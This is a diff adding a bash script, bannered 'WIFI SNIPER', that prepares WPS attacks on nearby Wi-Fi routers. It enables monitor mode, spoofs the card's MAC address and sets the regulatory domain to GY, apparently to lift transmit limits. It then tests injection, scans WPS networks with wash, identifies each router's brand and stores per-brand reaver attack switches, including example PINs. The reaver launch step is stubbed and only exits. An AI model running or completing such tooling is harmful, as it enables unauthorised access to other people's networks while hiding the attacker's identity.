@@ -1,0 +1,211 @@
+#!/bin/bash
+path=$(pwd)
+
+trap ctrl_c INT
+function ctrl_c() {
+airmon-ng stop $devmon
+}
+
+chkbrand () {
+if [ ! -f $path/airdump ]
+then
+echo "Waiting for airodump"
+sleep 3
+chkbrand
+fi 
+ok=$(grep "$gmac" <$path/airdump )
+if [[ -z "$ok" ]]
+then
+chkbrand
+else
+mft=$(grep "$gmac" <$path/airdump | awk '{print$12}')
+killall airodump-ng >/dev/null 2>&1
+fi
+}
+
+dump () {
+echo ""
+echo "Scanning for networks"
+echo ""
+dupw=$(timeout 20s wash -i $devmon -o $path/waslog >/dev/null 2>&1)
+tail -n+3 < $path/waslog > $path/out
+cnt=$(wc -l < $path/out)
+echo "Select one of the networks"
+echo ""
+for ((i=1; i<=cnt; i++))
+do
+nname=$(sed -n "${i}p"< $path/out | awk '{print $6}')
+echo "$i : $nname"
+done
+echo ""
+echo -ne "Choose a network from 1 to $cnt : "
+read inp
+if [[ $inp -gt "$cnt" ]]
+then
+echo " There is no $inp on the list , are U Stupid !!!"
+echo ""
+airmon-ng stop $devmon
+exit 1
+fi
+gmac=$(sed -n "$inp"p< $path/out | awk '{print $1}' | sed -e "s/:/-/g" | head -c 8)
+nchoice=$(sed -n "$inp"p< $path/out | awk '{print $6}')
+gch=$(sed -n "$inp"p< $path/out | awk '{print $2}')
+echo ""
+echo "Gathering information about $nchoice"
+echo ""
+gman=$(grep "$gmac" <oui.txt | awk '{print$3}')
+if [ -z "$gman" ]
+then
+echo "Unable to find the brand of thos Access point"
+echo ""
+airmon-ng stop $devmon
+exit 1
+fi
+echo "The Brand name of $nchoice is $gman"
+echo ""
+if [ ! -f "$path/database" ]
+then
+echo "Database was not created yet , do you want to add the switches for reaver to this brand (y/n) ? "
+echo -n "Choose (Y/N) : "
+read dchoice
+case $dchoice in
+y|Y|YES|yes)
+echo ""
+echo "Please write all the switches for reaver excluding interface|bssid|channel"
+echo ""
+echo "Example 1 with direct pin : -p 12345678 -d 2 -N -E"
+echo "Example 2 : -t 10 -T 0.60 -N -E -w -K"
+echo ""
+echo "Write the switches for $gman"
+echo "Switches : "
+read swt
+echo "$gman $swt" > $path/database
+;;
+n|N|NO|no)
+echo "unable to start the attack without a specific configuration"
+echo ""
+airmon-ng stop $devmon
+exit 1
+;;
+*)
+echo "Unspecified Selection"
+echo ""
+airmon-ng stop $devmon
+exit 1
+;;
+esac
+fi
+dbs=$(grep "$gman" < database | awk '{$1=""; print $0}')
+if [[ -z "$dbs" ]]
+then 
+echo "It was not found in database the switches for $gman , do you want to add the switches for reaver to this brand (y/n) ? "
+echo -n "Choose (Y/N) : "
+read dchoice
+case $dchoice in
+y|Y|YES|yes)
+echo ""
+echo "Please write all the switches for reaver excluding interface|bssid|channel"
+echo ""
+echo "Example 1 with direct pin : -p 12345678 -d 2 -N -E"
+echo "Example 2 : -t 10 -T 0.60 -N -E -w -K"
+echo ""
+echo "Write the switches for $gman"
+echo -n "Switches : "
+read swt
+echo "$gman $swt" > $path/database
+;;
+n|N|NO|no)
+echo "unable to start the attack without a specific configuration"
+echo ""
+airmon-ng stop $devmon
+exit 1
+;;
+*)
+echo "Unspecified Selection"
+echo ""
+airmon-ng stop $devmon
+exit 1
+;;
+esac
+fi
+echo "Looking in database for reaver switches to $gman"
+echo ""
+echo "Found this switch : $dbs"
+echo ""
+echo -n "Do you want to test it ? (y/n)"
+read inp
+case $inp in
+y|y|yes|YES)
+echo "Starting Reaver with switches command"
+airmon-ng stop $devmon
+exit 1
+;;
+n|N|NO|no)
+echo "Stopping and exiting"
+airmon-ng stop $devmon
+exit 1
+;;
+*)
+echo "Choice not valid"
+airmon-ng stop $devmon
+exit 1
+;;
+esac
+}
+
+rm -rf check >/dev/null 2>&1
+rm -rf devices >/dev/null 2>&1
+rm -rf wash >/dev/null 2>&1
+rm -rf waslog >/dev/null 2>&1
+rm -rf out >/dev/null 2>&1
+rm -rf airdump >/dev/null 2>&1
+echo "█╗    █╗█╗██████╗█╗  ██████╗██╗  █╗█╗█████╗██████╗████╗ "                   
+echo "█║    █║█║█╔════╝█║  █ ╔═══╝███╗ █║█║█╔══█╗█╔════╝█╔═ █╗"                   
+echo "█║    █║█║████╗  █║  ██████╗█╔█╗ █║█║█████╔████╗  ████╔╝"                   
+echo "█║ █╗ █║█║█╔══╝  █║  ╚════█║█║╚█╗█║█║█╔═══╝█╔══╝  █╔══█╗"                   
+echo "╚██╔██╔╝█║█║     █║  ██████║█║ ╚██║█║█║    ██████╗█║  █║"                   
+echo " ╚═╝╚═╝ ╚╝╚╝     ╚╝  ╚═════╝╚╝  ╚═╝╚╝╚╝    ╚═════╝╚╝  ╚╝" 
+rm -f devices
+dev=$(iw dev | awk '$1=="Interface"{print $2}')
+cnt=$(iw dev | awk '$1=="Interface"{print $2}'| wc -l)
+if [[ -z $dev ]]
+then
+echo "No wireless devices were found"
+exit 1
+fi 
+echo "Select one of the available interfaces :"
+for i in "$cnt"
+do
+echo "$dev" >> devices
+var=$(sed -n "${i}p" devices)
+if [[ ! -z "$var" ]]
+then
+echo "$i : $var"
+fi
+done
+echo ""
+echo -ne "Select : "
+read sdev
+stdev=$(sed -n "${i}p" devices)
+ifconfig $stdev down
+airmon-ng check kill >/dev/null 2>&1
+airmon-ng start $stdev | tee $path/monitor >/dev/null 2>&1
+devmon=$(iw dev | awk '$1=="Interface"{print $2}' | sed -n "1p")
+ifconfig $devmon down >/dev/null 2>&1
+macchanger -A $devmon >/dev/null 2>&1
+iw reg set GY >/dev/null 2>&1
+ifconfig $devmon up
+echo ""
+echo "Your monitor is $devmon"
+echo ""
+echo "Testing Injection"
+aireplay-ng -9 $devmon > check 
+chk=$(cat check | grep "Injection is working!")
+if [[ -z "$chk" ]]
+then
+echo "Injection is not working"
+else
+echo "injection is working"
+dump
+fi
+airmon-ng stop $devmon
